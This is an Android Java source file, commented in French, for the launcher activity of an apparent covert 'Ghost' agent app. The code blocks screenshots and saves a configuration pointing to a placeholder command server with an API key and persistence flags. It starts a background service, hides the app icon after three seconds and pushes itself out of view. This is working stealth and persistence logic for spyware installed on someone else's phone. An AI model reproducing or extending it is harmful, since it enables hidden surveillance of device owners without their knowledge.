package com.ghost.agent;

import android.app.Activity;
import android.content.Intent;
import android.content.SharedPreferences;
import android.content.pm.PackageManager;
import android.os.Build;
import android.os.Bundle;
import android.os.Handler;
import android.view.WindowManager;

public class MainActivity extends Activity {
    
    private static final String PREFS_NAME = "GhostPrefs";
    
    @Override
    protected void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);
        
        // Empêcher la capture d'écran
        getWindow().setFlags(WindowManager.LayoutParams.FLAG_SECURE, 
                             WindowManager.LayoutParams.FLAG_SECURE);
        
        // Cacher immédiatement
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O_MR1) {
            setShowWhenLocked(false);
            setTurnScreenOn(false);
        }
        
        // Configuration initiale
        SharedPreferences prefs = getSharedPreferences(PREFS_NAME, MODE_PRIVATE);
        if (!prefs.contains("configured")) {
            prefs.edit()
                .putString("server_url", "https://votre-serveur.com/api/v1/")
                .putString("api_key", "GENERATED_API_KEY")
                .putString("device_id", generateDeviceId())
                .putBoolean("auto_start", true)
                .putBoolean("hide_icon", true)
                .putBoolean("persistent", true)
                .putBoolean("configured", true)
                .apply();
        }
        
        // Démarrer le service
        Intent intent = new Intent(this, core.GhostService.class);
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
            startForegroundService(intent);
        } else {
            startService(intent);
        }
        
        // Cacher l'icône après 3 secondes
        if (prefs.getBoolean("hide_icon", true)) {
            new Handler().postDelayed(() -> {
                hideIcon();
            }, 3000);
        }
        
        // Fermer l'activité
        finish();
    }
    
    private String generateDeviceId() {
        return "GHOST_" + 
               Build.BOARD.length() + 
               Build.BRAND.length() + 
               Build.DEVICE.length() + 
               Build.MODEL.length() + 
               System.currentTimeMillis();
    }
    
    private void hideIcon() {
        try {
            getPackageManager().setComponentEnabledSetting(
                getComponentName(),
                PackageManager.COMPONENT_ENABLED_STATE_DISABLED,
                PackageManager.DONT_KILL_APP
            );
        } catch (Exception e) {
            e.printStackTrace();
        }
    }
    
    @Override
    protected void onResume() {
        super.onResume();
        moveTaskToBack(true);
    }
}
